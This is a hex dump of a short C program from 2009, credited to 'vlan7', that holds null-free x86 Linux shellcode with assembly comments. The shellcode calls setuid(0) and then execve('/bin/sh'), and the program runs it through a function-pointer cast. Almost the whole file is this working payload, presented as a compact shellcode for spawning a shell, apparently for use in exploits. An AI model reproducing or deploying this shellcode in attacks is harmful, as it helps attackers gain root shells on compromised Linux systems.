00000000  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include <stdio.|
00000010  68 3e 0d 0a 0d 0a 63 6f  6e 73 74 20 63 68 61 72  |h>....const char|
00000020  20 73 63 5b 5d 3d 20 22  5c 78 33 31 5c 78 64 62  | sc[]= "\x31\xdb|
00000030  22 20 2f 2f 78 6f 72 20  65 62 78 2c 65 62 78 0d  |" //xor ebx,ebx.|
00000040  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000050  20 20 22 5c 78 38 64 5c  78 34 33 5c 78 31 37 22  |  "\x8d\x43\x17"|
00000060  20 2f 2f 4c 45 41 20 65  61 78 2c 5b 65 62 78 20  | //LEA eax,[ebx |
00000070  2b 20 30 78 31 37 5d 20  2f 4c 45 41 20 69 73 20  |+ 0x17] /LEA is |
00000080  46 41 53 54 45 52 20 74  68 61 20 70 75 73 68 2f  |FASTER tha push/|
00000090  70 6f 70 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |pop..           |
000000a0  20 20 20 20 20 20 22 5c  78 39 39 22 20 2f 2f 63  |      "\x99" //c|
000000b0  64 71 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |dq..            |
000000c0  20 20 20 20 20 22 5c 78  63 64 5c 78 38 30 22 20  |     "\xcd\x80" |
000000d0  2f 2f 69 6e 74 20 38 30  20 2f 2f 73 65 74 75 69  |//int 80 //setui|
000000e0  64 28 30 29 20 73 68 6f  75 6c 64 6e 27 74 20 72  |d(0) shouldn't r|
000000f0  65 74 75 72 6e 73 20 2d  31 20 72 69 67 68 74 3f  |eturns -1 right?|
00000100  20 3b 29 0d 0a 20 20 20  20 20 20 20 20 20 20 20  | ;)..           |
00000110  20 20 20 20 20 20 22 5c  78 62 30 5c 78 30 62 22  |      "\xb0\x0b"|
00000120  20 2f 2f 6d 6f 76 20 61  6c 2c 30 62 68 0d 0a 20  | //mov al,0bh.. |
00000130  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000140  22 5c 78 35 32 22 20 2f  2f 70 75 73 68 20 65 64  |"\x52" //push ed|
00000150  78 20 2f 54 65 72 6d 69  6e 61 20 6c 61 20 63 61  |x /Termina la ca|
00000160  64 65 6e 61 20 2f 2f 62  69 6e 2f 73 68 20 63 6f  |dena //bin/sh co|
00000170  6e 20 75 6e 20 30 0d 0a  20 20 20 20 20 20 20 20  |n un 0..        |
00000180  20 20 20 20 20 20 20 20  20 22 5c 78 36 38 5c 78  |         "\x68\x|
00000190  36 65 5c 78 32 66 5c 78  37 33 5c 78 36 38 22 0d  |6e\x2f\x73\x68".|
000001a0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
000001b0  20 20 22 5c 78 36 38 5c  78 32 66 5c 78 32 66 5c  |  "\x68\x2f\x2f\|
000001c0  78 36 32 5c 78 36 39 22  0d 0a 20 20 20 20 20 20  |x62\x69"..      |
000001d0  20 20 20 20 20 20 20 20  20 20 20 22 5c 78 38 39  |           "\x89|
000001e0  5c 78 65 33 22 20 2f 2f  6d 6f 76 20 65 62 78 2c  |\xe3" //mov ebx,|
000001f0  65 73 70 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |esp..           |
00000200  20 20 20 20 20 20 22 5c  78 38 39 5c 78 64 31 22  |      "\x89\xd1"|
00000210  20 2f 2f 6d 6f 76 20 65  63 78 2c 65 64 78 0d 0a  | //mov ecx,edx..|
00000220  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000230  20 22 5c 78 63 64 5c 78  38 30 22 3b 20 2f 2f 69  | "\xcd\x80"; //i|
00000240  6e 74 20 38 30 68 0d 0a  0d 0a 69 6e 74 20 6d 61  |nt 80h....int ma|
00000250  69 6e 28 29 0d 0a 7b 0d  0a 20 20 70 72 69 6e 74  |in()..{..  print|
00000260  66 28 22 5c 6e 53 4d 41  4c 4c 45 53 54 20 53 45  |f("\nSMALLEST SE|
00000270  54 55 49 44 20 26 20 45  58 45 43 56 45 20 47 4e  |TUID & EXECVE GN|
00000280  55 2f 4c 49 4e 55 58 20  78 38 36 20 53 54 41 42  |U/LINUX x86 STAB|
00000290  4c 45 20 53 48 45 4c 4c  43 4f 44 45 20 22 0d 0a  |LE SHELLCODE "..|
000002a0  20 20 20 20 20 20 20 20  22 57 49 54 48 4f 55 54  |        "WITHOUT|
000002b0  20 4e 55 4c 4c 53 20 54  48 41 54 20 53 50 41 57  | NULLS THAT SPAW|
000002c0  4e 53 20 41 20 53 48 45  4c 4c 22 0d 0a 20 20 20  |NS A SHELL"..   |
000002d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002e0  20 20 20 20 20 22 5c 6e  5c 6e 43 6f 64 65 64 20  |     "\n\nCoded |
000002f0  62 79 20 76 6c 61 6e 37  22 0d 0a 20 20 20 20 20  |by vlan7"..     |
00000300  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000310  20 20 20 22 5c 6e 5c 74  20 2b 20 76 6c 61 6e 37  |   "\n\t + vlan7|
00000320  5b 61 74 5d 62 69 67 66  6f 6f 74 2e 63 6f 6d 22  |[at]bigfoot.com"|
00000330  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00000340  20 20 20 20 20 20 20 20  20 20 22 5c 6e 5c 74 20  |          "\n\t |
00000350  2b 20 68 74 74 70 3a 2f  2f 76 6c 61 6e 37 2e 62  |+ http://vlan7.b|
00000360  6c 6f 67 73 70 6f 74 2e  63 6f 6d 22 0d 0a 20 20  |logspot.com"..  |
00000370  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000380  20 20 20 20 20 20 22 5c  6e 5c 6e 5b 2b 5d 20 44  |      "\n\n[+] D|
00000390  61 74 65 3a 20 34 2f 4a  75 6c 2f 32 30 30 39 22  |ate: 4/Jul/2009"|
000003a0  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
000003b0  20 20 20 20 20 20 20 20  20 20 22 5c 6e 5b 2b 5d  |          "\n[+]|
000003c0  20 54 68 61 6e 6b 73 20  74 6f 3a 20 73 63 68 33  | Thanks to: sch3|
000003d0  6d 34 2e 20 48 65 20 69  6e 69 74 69 61 74 65 64  |m4. He initiated|
000003e0  20 74 68 65 20 66 75 6e  6e 79 20 67 61 6d 65 2e  | the funny game.|
000003f0  22 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |"..             |
00000400  20 20 20 20 20 20 20 20  20 20 20 22 5c 6e 5c 6e  |           "\n\n|
00000410  5b 2b 5d 20 53 68 65 6c  6c 63 6f 64 65 20 53 69  |[+] Shellcode Si|
00000420  7a 65 3a 20 25 64 20 62  79 74 65 73 5c 6e 5c 6e  |ze: %d bytes\n\n|
00000430  22 2c 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |",..            |
00000440  20 20 20 20 20 20 20 20  20 20 20 20 73 69 7a 65  |            size|
00000450  6f 66 28 73 63 29 2d 31  29 3b 0d 0a 20 20 20 20  |of(sc)-1);..    |
00000460  20 20 20 20 28 2a 28 76  6f 69 64 20 28 2a 29 28  |    (*(void (*)(|
00000470  29 29 20 73 63 29 28 29  3b 0d 0a 20 20 20 20 20  |)) sc)();..     |
00000480  20 20 20 72 65 74 75 72  6e 20 30 3b 0d 0a 7d     |   return 0;..}|
0000048f
